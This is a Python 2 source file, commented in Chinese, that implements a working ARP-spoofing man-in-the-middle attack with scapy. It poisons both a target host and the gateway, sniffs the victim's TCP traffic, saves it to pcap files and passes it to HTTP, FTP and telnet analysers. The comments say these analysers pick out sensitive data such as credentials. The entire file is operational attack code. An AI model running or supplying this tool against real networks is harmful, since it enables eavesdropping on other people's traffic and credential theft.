# coding:utf-8


from scapy.all import *
import threading
import socket
import uuid
import time
import sys
import httppcap
import ftppcap
import telnetpcap


class arpspoofer():

    def __init__(self,localip,targetip,gatewayip):
        self.targetip = targetip
        self.localip = localip
        self.gatewayip = gatewayip
        self.srcmac = self.get_mac_address()
        self.targetmac = self.getMac(targetip)
        self.gatewaymac = self.getMac(gatewayip)
        self.pkttarget = self.createArp2Station()
        self.pktgateway = self.createArp2Gateway()


    """由于在windows使用scapy的getmacbyip()获取本机mac地址为广播地址,
        达不到想要的功能，
        所以自定义方法来实现获取本机mac地址的功能"""

    def get_mac_address(self):
        mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
        return ":".join([mac[e:e+2] for e in range(0,11,2)])


    """除本机MAC地址的获取不使用此方法外，
        目标主机以及网关的mac地址均采用此方法"""

    def getMac(self,dstip):

        """调用 scapy 的 getmacbyip 方法检测目标是否存活"""

        try:
            tgtMac = getmacbyip(dstip)
            return tgtMac

        except:
            print '[*] Target ip error' 


    def createArp2Station(self):

        '''
        生成ARP数据包，伪造网关欺骗目标计算机
        srcMac:本机的MAC地址，充当中间人
        tgtMac:目标计算机的MAC
        gatewayIP:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
        tgtIP:目标计算机的IP
        op=2,表示ARP响应
        '''

        pkt = Ether(src=self.srcmac,dst=self.targetmac)/ARP(hwsrc=self.srcmac,psrc=self.gatewayip,hwdst=self.targetmac,pdst=self.targetip,op=1)
        return pkt

    def createArp2Gateway(self):

        """
        生成ARP数据包，伪造目标计算机欺骗网关
        srcMac:本机的MAC地址，充当中间人
        gatewayMac:网关的MAC
        tgtIP:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击
        gatewayIP:网关的IP
        op=2,表示ARP响应
        """

        pkt = Ether(src=self.srcmac, dst=self.gatewaymac)/ARP(hwsrc=self.srcmac,psrc=self.targetip,hwdst=self.gatewaymac,pdst=self.gatewayip,op=2)
        return pkt


    '''对目标客户机进行欺骗'''

    def arpSpooftarget(self,pkt):
        print "[*] ARP to target"
        while True:
            sendp(pkt, loop=1, verbose=False)


    """对网关进行欺骗"""

    def aprSpoofgateway(self,pkt):
        print "[*] ARP to gateway"
        while True:
            sendp(pkt, loop=1, verbose=False)


    '''嗅探目标主机发出的请求包，将目标主机发出的请求包存入到本地文件进行备份
    同时对请求包进行分析，如果求情报符合审核要求就存到html文件中，方便后续的查看
    如果http报文中存在敏感信息，就将存在敏感信息的数据包序号存到log文件中'''


    """将拦截到的目标主机发送的符合条件的数据包存入本地并且进行相应协议的分析"""


    def dealreqpcap(self,filename,reqpcap):
        wrpcap("reqpcap/"+filename,reqpcap)
        dohttppcap = threading.Thread(name=filename, target=httppcap.httpPcapReport, args=(filename,))
        dohttppcap.start()
        doftppcap = threading.Thread(name=filename, target=ftppcap.ftpPcapReport, args=(filename,))
        doftppcap.start()
        dotelnetpcap = threading.Thread(name=filename, target=telnetpcap.telnetPcapReport, args=(filename,))
        dotelnetpcap.start()


    """将拦截到的路由发送的符合条件的数据包存入本地并且进行相应协议的分析"""


    def dealreppcap(self,filename,reppcap):
        wrpcap("reppcap/"+filename,reppcap)
        dohttpreppcap = threading.Thread(name=filename, target=httppcap.httpPcapRep, args=(filename,))
        dohttpreppcap.start()


    '''嗅探数据包，分为首先嗅探客户机的请求包，如果是客户机请求包，备份后转发
    如果是路由网关或者外网服务器发送的响应包就根据规则替换内容，之后再转发
    如果不符合以上情况就直接转发'''


    def sniffTarget(self):
        reqdata = []
        repdata = []

        while True:
            data = sniff(filter="tcp and host %s" % self.targetip,count=1000)
            for i in range(0,1000):
                if data[i].src == self.targetmac:
                    reqdata.append(data[i])
                try:
                    if data[i].payload.dst == self.targetip:
                        repdata.append(data[i])
                except:
                    pass

            if len(reqdata)>= 500:
                filename = time.strftime("%m-%d-%H-%M-%S.pcap", time.localtime())
                saveReq = threading.Thread(name="savereqpcap",target=self.dealreqpcap,args=(filename,reqdata,))
                saveReq.start()
                reqdata = []

            if len(repdata) >= 500:
                filename = time.strftime("%m-%d-%H-%M-%S.pcap", time.localtime())
                saveRep = threading.Thread(name="savereppcap",target=self.dealreppcap,args=(filename,repdata,))
                saveRep.start()
                repdata = []

    '''参数的传递使用optparse库'''

    def start(self):

        if self.srcmac == None or self.targetmac == None or self.gatewaymac == None:
            print "[*] Get mac error, please try again"
            sys.exit(-1)

        print "[*] Arpspoofer Initial success"
        print """
--------------------------------
|Lcoal-mac   |{}|
--------------------------------
|Target-mac  |{}|
--------------------------------
|Gateway-mac |{}|
--------------------------------
    """.format(self.srcmac,self.targetmac,self.gatewaymac)
        
        
        raw_input('[*] Arpspoof continue(Any press):')
        print "\n[*] ARP spoof is starting!"

        # 进行对目标主机以及网关的双向欺骗
        
        """欺骗目标主机"""
        targetspoof = threading.Thread(name="totarget", target=self.arpSpooftarget, args=(self.pkttarget,))
        targetspoof.start()

        """欺骗网关"""

        gatewayspoof = threading.Thread(name="togateway", target=self.aprSpoofgateway, args=(self.pktgateway,))
        gatewayspoof.start()

        """嗅探网络数据包"""
        
        targetsniffer = threading.Thread(name="snifftarget", target=self.sniffTarget)
        targetsniffer.start()
